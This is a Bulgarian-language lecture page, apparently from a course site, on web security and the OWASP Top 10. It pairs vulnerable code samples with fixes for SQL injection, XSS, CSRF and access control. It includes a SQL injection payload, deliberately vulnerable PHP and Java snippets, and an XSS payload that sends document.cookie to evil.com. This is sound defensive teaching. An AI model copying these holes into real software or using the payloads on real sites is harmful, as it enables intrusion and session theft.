---
title: "Лекция"
sidebar_position: 1
slug: lecture
tags: [security, owasp, injection, xss, csrf, authentication, https, encryption, vulnerabilities]
---

import InfoBox from '@site/src/components/InfoBoxes/InfoBox';
import WarningBox from '@site/src/components/InfoBoxes/WarningBox';
import SuccessBox from '@site/src/components/InfoBoxes/SuccessBox';
import WhyBox from '@site/src/components/InfoBoxes/WhyBox';
import LearningObjectives from '@site/src/components/LearningObjectives';
import QuickSummary from '@site/src/components/QuickSummary';
import CollapsibleSection from '@site/src/components/CollapsibleSection';
import ComparisonBox from '@site/src/components/Comparison/ComparisonBox';
import Grid from '@site/src/components/Grid/Grid';
import Card from '@site/src/components/Grid/Card';
import ViewSlidesButton from '@site/src/components/ViewSlidesButton';
import useBaseUrl from '@docusaurus/useBaseUrl';

# Уеб Сигурност: OWASP Top 10

<img src={useBaseUrl('/img/diagrams/security/security-header.svg')} alt="Security Header" style={{width: '100%', maxWidth: '800px', margin: '20px auto', display: 'block'}} />

<ViewSlidesButton lectureSlug="web-security-fundamentals" />

<QuickSummary>

**Ключови познания:**
- **OWASP Top 10** е авторитетният стандарт за уеб сигурност
- **SQL Injection** се предотвратява с **Prepared Statements**
- **XSS** се блокира с **Output Encoding** и **CSP**
- **CSRF** се защитава с **токени** и **SameSite cookies**
- **Сигурна автентикация** изисква **bcrypt**, **MFA** и правилно управление на сесии

</QuickSummary>

<LearningObjectives objectives={[
  "Идентифициране и обяснение на ключови OWASP Top 10 рискове",
  "Прилагане на техники за предотвратяване на Injection, XSS и CSRF атаки",
  "Анализ на уязвим код и предлагане на сигурни алтернативи",
  "Оценка на secure configuration и deployment практики",
  "Разбиране на Zero Trust и AI роли в модерната сигурност"
]} />

---

## Защо е критична уеб сигурността?

<WhyBox title="Защо да учим уеб сигурност?">

Уеб приложенията захранват почти всичко онлайн - от банкиране до социални мрежи. Това ги прави **главна мишена** за автоматизирани и AI-управлявани атаки.

**Последствия от пробиви:**
- 💰 **Финансови загуби** - средно $5.9 милиона в finance сектора
- 🔓 **Data breaches** - лични данни, финансова информация
- 📉 **Репутационни щети** - загуба на потребителско доверие
- ⚖️ **Правни проблеми** - GDPR глоби до 4% от годишния оборот

</WhyBox>

<InfoBox title="Какво е OWASP?">

**Open Web Application Security Project (OWASP)** е некомерсиална организация, предоставяща безпристрастна информация за сигурността на приложенията.

**OWASP Top 10:**
- 📊 **Evidence-based** - базиран на реални данни
- 🔄 **Редовно обновяван** - последна версия 2025
- 🎯 **Приоритизиран** - класиран по експлоатируемост и въздействие
- 📖 **Стандарт** - широко признат в индустрията

</InfoBox>

---

## OWASP Top 10 (2025)

<img src={useBaseUrl('/img/diagrams/security/owasp-top10.svg')} alt="OWASP Top 10" style={{width: '100%', maxWidth: '800px', margin: '20px auto', display: 'block'}} />

<Grid columns={2}>
  <Card title="Критични Рискове" icon="🚨">
    - **A01** - Broken Access Control
    - **A02** - Security Misconfiguration
    - **A03** - Injection
    - **A04** - Cryptographic Failures
  </Card>
  <Card title="Допълнителни Рискове" icon="⚠️">
    - **A05** - SSRF
    - **A06** - Vulnerable Components
    - **A07** - Authentication Failures
    - **A08-A10** - Integrity, Logging, XSS
  </Card>
</Grid>

---

## Основни Концепции: Input Handling

<WarningBox title="Златно правило">

**НИКОГА не вярвайте на потребителския вход!** Всички данни от форми, URL-и, headers и API-та са потенциално злонамерени.

</WarningBox>

### Validation vs Sanitization

<ComparisonBox
  left={{
    title: "Validation",
    content: (
      <ul>
        <li>Проверява дали входът отговаря на очакван формат</li>
        <li>Email формат, дължина, тип данни</li>
        <li><strong>Whitelist подход</strong> - позволява само валидни стойности</li>
        <li>Пример: <code>/^[a-zA-Z0-9]+$/</code></li>
      </ul>
    )
  }}
  right={{
    title: "Sanitization",
    content: (
      <ul>
        <li>Премахва или encode-ва опасни символи</li>
        <li>Escaping на специални символи</li>
        <li>Context-specific (HTML, SQL, JS)</li>
        <li>Пример: <code>htmlspecialchars()</code></li>
      </ul>
    )
  }}
/>

<SuccessBox title="Whitelist vs Blacklist">

Винаги предпочитайте **whitelist** подхода - позволявайте само известни добри стойности. Blacklist подходът (блокиране на лоши стойности) е ненадежден, защото атакуващите постоянно намират нови вектори.

</SuccessBox>

---

## SQL Injection (A03)

<img src={useBaseUrl('/img/diagrams/security/sql-injection.svg')} alt="SQL Injection Attack" style={{width: '100%', maxWidth: '800px', margin: '20px auto', display: 'block'}} />

<InfoBox title="Какво е SQL Injection?">

Атакуващият инжектира злонамерен SQL код чрез потребителски вход, причинявайки изпълнение на нежелани команди в базата данни.

</InfoBox>

### Уязвим Код

```java
// ❌ НИКОГА не правете това!
String query = "SELECT * FROM users WHERE id = '" + userId + "'";
Statement stmt = conn.createStatement();
ResultSet results = stmt.executeQuery(query);
```

Ако `userId` е `' OR '1'='1' --`, заявката става:
```sql
SELECT * FROM users WHERE id = '' OR '1'='1' --'
```
Това връща **всички** записи в таблицата!

### Prepared Statements - Златният Стандарт

```java
// ✅ Сигурен код с prepared statement
String sql = "SELECT * FROM users WHERE id = ?";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setString(1, userId);  // userId се третира като DATA
ResultSet results = pstmt.executeQuery();
```

<SuccessBox title="Защо работят Prepared Statements?">

Prepared statements **разделят кода от данните**. Базата данни третира потребителския вход като **литерален текст**, а не като изпълним SQL код. Дори злонамерен вход се интерпретира като обикновен string.

</SuccessBox>

### Допълнителни защити

1. **Input Validation** - проверка на тип и формат
2. **Least Privilege** - database потребителят има минимални права
3. **Escaping** - като fallback, но не е достатъчно само това

---

## Cross-Site Scripting (XSS)

<img src={useBaseUrl('/img/diagrams/security/xss-attack.svg')} alt="XSS Attack" style={{width: '100%', maxWidth: '800px', margin: '20px auto', display: 'block'}} />

<InfoBox title="Какво е XSS?">

Атакуващият инжектира злонамерен JavaScript код в уеб страници, който се изпълнява в **браузърите на други потребители**. Това позволява кражба на cookies, session hijacking и други атаки.

</InfoBox>

### Типове XSS

<Grid columns={3}>
  <Card title="Stored XSS" icon="💾">
    Записан в DB, засяга всички потребители, които видят съдържанието
  </Card>
  <Card title="Reflected XSS" icon="🔄">
    Чрез URL параметър, изисква жертвата да кликне на линк
  </Card>
  <Card title="DOM-based XSS" icon="🌐">
    Изцяло в клиента, без сървърна комуникация
  </Card>
</Grid>

### Уязвим Код

```php
// ❌ Никога не показвайте неescaped вход!
echo "<h1>Welcome, " . $_GET['username'] . "!</h1>";
```

Ако `username` е `<script>document.location='http://evil.com?c='+document.cookie</script>`, скриптът ще открадне cookies!

### Защита: Output Encoding

```php
// ✅ HTML encoding предотвратява XSS
echo "<h1>Welcome, " . htmlspecialchars($_GET['username'], ENT_QUOTES, 'UTF-8') . "!</h1>";
```

### Content Security Policy (CSP)

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com
```

<SuccessBox title="CSP в действие">

CSP казва на браузъра **откъде може да зарежда скриптове**. Дори да има XSS уязвимост, inline скриптовете ще бъдат блокирани, ако CSP е конфигуриран правилно.

</SuccessBox>

---

## Cross-Site Request Forgery (CSRF)

<img src={useBaseUrl('/img/diagrams/security/csrf-attack.svg')} alt="CSRF Attack" style={{width: '100%', maxWidth: '800px', margin: '20px auto', display: 'block'}} />

<InfoBox title="Какво е CSRF?">

Атаката **подмамва автентикиран потребител** да изпрати нежелана заявка към сайт, в който е логнат. Браузърът автоматично включва session cookies, така че заявката изглежда легитимна.

</InfoBox>

### XSS vs CSRF

<ComparisonBox
  left={{
    title: "XSS",
    content: (
      <ul>
        <li><strong>Инжектира:</strong> JavaScript код</li>
        <li><strong>Жертва:</strong> Други потребители</li>
        <li><strong>Изпълнява се в:</strong> Браузъра на жертвата</li>
        <li><strong>Цел:</strong> Кражба на данни</li>
      </ul>
    )
  }}
  right={{
    title: "CSRF",
    content: (
      <ul>
        <li><strong>Експлоатира:</strong> Доверието на сървъра</li>
        <li><strong>Жертва:</strong> Автентикиран потребител</li>
        <li><strong>Изпълнява се:</strong> Заявка от друг сайт</li>
        <li><strong>Цел:</strong> Извършване на действия</li>
      </ul>
    )
  }}
/>

### Защита: CSRF Tokens

```html
<!-- В HTML формата -->
<form method="POST" action="/transfer">
  <input type="hidden" name="csrf_token" value="random_unique_token_xyz">
  <input type="text" name="amount">
  <button type="submit">Transfer</button>
</form>
```

```php
// На сървъра
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    http_response_code(403);
    exit("Invalid CSRF token");
}
```

### SameSite Cookies

```http
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

| SameSite Value | Поведение |
|----------------|-----------|
| `Strict` | Cookie не се изпраща при cross-site заявки |
| `Lax` | Cookie се изпраща само за GET навигации |
| `None` | Cookie се изпраща винаги (изисква `Secure`) |

---

## Authentication & Authorization (A01, A07)

<img src={useBaseUrl('/img/diagrams/security/auth-flow.svg')} alt="Authentication Flow" style={{width: '100%', maxWidth: '800px', margin: '20px auto', display: 'block'}} />

### Broken Access Control (A01)

<WarningBox title="Най-критичният риск">

**Broken Access Control** е №1 в OWASP Top 10 2025. Потребителите могат да достъпват ресурси или да извършват действия, за които нямат права.

</WarningBox>

```php
// ❌ Уязвим код - липсва проверка на права
$userId = $_GET['userId'];
$orders = getOrdersForUser($userId);  // Всеки може да види чужди поръчки!

// ✅ Сигурен код - проверка на права
$requestedUserId = $_GET['userId'];
if ($_SESSION['user_id'] !== $requestedUserId && !isAdmin()) {
    http_response_code(403);
    exit("Access denied");
}
$orders = getOrdersForUser($requestedUserId);
```

### Password Security

<SuccessBox title="Правилно съхранение на пароли">

```python
# ✅ Използвайте bcrypt или Argon2
import bcrypt

# Хеширане при регистрация
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())

# Проверка при login
if bcrypt.checkpw(input_password.encode(), stored_hash):
    # Valid password
```

**Никога** не съхранявайте пароли в plain text или с MD5/SHA1!

</SuccessBox>

### Session Management Best Practices

```http
Set-Cookie: session_id=abc123xyz;
  Secure;        # Само през HTTPS
  HttpOnly;      # Недостъпен за JavaScript
  SameSite=Strict;
  Max-Age=3600;  # 1 час
```

<Grid columns={2}>
  <Card title="При Login" icon="🔑">
    - Regenerate session ID
    - Проверете MFA (ако е enabled)
    - Логвайте login attempt
    - Rate limiting
  </Card>
  <Card title="При Logout" icon="🚪">
    - Invalidate session на сървъра
    - Clear session cookie
    - Redirect към login
    - Не оставяйте "orphan" sessions
  </Card>
</Grid>

---

## Secure Configuration (A02)

<img src={useBaseUrl('/img/diagrams/security/secure-config.svg')} alt="Secure Configuration" style={{width: '100%', maxWidth: '800px', margin: '20px auto', display: 'block'}} />

### Security Misconfiguration примери

- 📂 Directory listing enabled
- 🏷️ Server version в headers
- ⚠️ Verbose error messages
- 🔓 Default credentials
- 📜 TLS 1.0/1.1 enabled

### Nginx Security Config

```nginx
server {
    listen 443 ssl http2;
    server_name example.com;

    # TLS Configuration
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers EECDH+AESGCM:EDH+AESGCM;
    ssl_prefer_server_ciphers on;

    # Security Headers
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header Content-Security-Policy "default-src 'self'" always;

    # Disable server tokens
    server_tokens off;

    # Disable directory listing
    autoindex off;
}
```

---

## Secure Development Lifecycle

<img src={useBaseUrl('/img/diagrams/security/sdlc-security.svg')} alt="Secure SDLC" style={{width: '100%', maxWidth: '800px', margin: '20px auto', display: 'block'}} />

<InfoBox title="Shift-Left Security">

Интегрирайте сигурността във **всяка фаза** на разработката, не само в края. По-рано откритите уязвимости са по-евтини за отстраняване.

</InfoBox>

### Security Testing Tools

| Тип | Инструменти | Кога |
|-----|-------------|------|
| **SAST** | SonarQube, Semgrep, CodeQL | По време на coding |
| **DAST** | OWASP ZAP, Burp Suite | При тестване |
| **SCA** | Snyk, Dependabot, npm audit | При build |
| **Pentest** | Metasploit, Kali Linux | Преди production |

---

## Real-World Breaches

<CollapsibleSection title="📌 Sony PlayStation Network (2011)">

**Риск:** SQL Injection (A03)

**Въздействие:** 77 милиона компрометирани акаунти, седмици downtime, милиони долари загуби

**Урок:** Prepared statements биха предотвратили атаката

</CollapsibleSection>

<CollapsibleSection title="📌 Equifax (2017)">

**Риск:** Vulnerable Components (A06)

**Въздействие:** 147 милиона изложени записи, $700+ милиона settlement

**Урок:** Редовното patching на dependencies е критично

</CollapsibleSection>

<CollapsibleSection title="📌 Capital One (2019)">

**Риск:** SSRF / Security Misconfiguration (A02)

**Въздействие:** 100 милиона кредитни заявления, $80 милиона глоба

**Урок:** Cloud security и network segmentation

</CollapsibleSection>

---

## Emerging Trends

### Zero Trust Security

<InfoBox title="Never Trust, Always Verify">

**Zero Trust** приема, че нито един потребител или устройство не е надеждно по подразбиране, дори вътре в мрежата.

Принципи:
- 🔒 Continuous verification
- 🎯 Least privilege access
- 🔲 Micro-segmentation
- 📊 Context-based access decisions

</InfoBox>

### AI в Security

<Grid columns={2}>
  <Card title="AI като защита" icon="🛡️">
    - AI-enhanced WAFs
    - Anomaly detection
    - Automated threat hunting
    - RASP (Runtime Protection)
  </Card>
  <Card title="AI като заплаха" icon="⚠️">
    - Automated attack tools
    - Deepfake phishing
    - AI-generated malware
    - Adversarial attacks
  </Card>
</Grid>

---

## Обобщение

<Grid columns={2}>
  <Card title="Основни Атаки" icon="🎯">
    - **SQL Injection** → Prepared Statements
    - **XSS** → Output Encoding + CSP
    - **CSRF** → Tokens + SameSite
    - **Broken Access** → Server-side checks
  </Card>
  <Card title="Best Practices" icon="✅">
    - Never trust user input
    - Secure password hashing
    - HTTPS everywhere
    - Regular patching
    - Security in SDLC
  </Card>
</Grid>

---

## Best Practices Checklist

<SuccessBox title="Security Checklist">

**Input Handling:**
- [ ] Validate и sanitize всички входове
- [ ] Whitelist подход
- [ ] Prepared statements за DB

**Authentication:**
- [ ] bcrypt/Argon2 за пароли
- [ ] MFA за чувствителни акаунти
- [ ] Secure session management

**Configuration:**
- [ ] HTTPS + HSTS
- [ ] Security headers
- [ ] Disable verbose errors
- [ ] Regular updates

</SuccessBox>

<WarningBox title="Често срещани грешки">

- Конкатениране на потребителски вход в SQL
- Показване на unescaped данни в HTML
- Съхранение на пароли в plain text или MD5
- Липса на CSRF защита на форми
- Server version в HTTP headers
- Directory listing enabled

</WarningBox>

---

## Допълнителни Ресурси

### Официална Документация
- [OWASP Top 10](https://owasp.org/Top10/) - Основният стандарт
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) - Практически съвети
- [OWASP ASVS](https://owasp.org/www-project-application-security-verification-standard/) - Verification Standard

### Практика
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) - Vulnerable web app за практика
- [WebGoat](https://owasp.org/www-project-webgoat/) - Interactive security lessons
- [HackTheBox](https://www.hackthebox.com/) - CTF challenges

### Инструменти
- [OWASP ZAP](https://www.zaproxy.org/) - Free security scanner
- [Burp Suite](https://portswigger.net/burp) - Web security testing
- [Snyk](https://snyk.io/) - Dependency vulnerability scanner
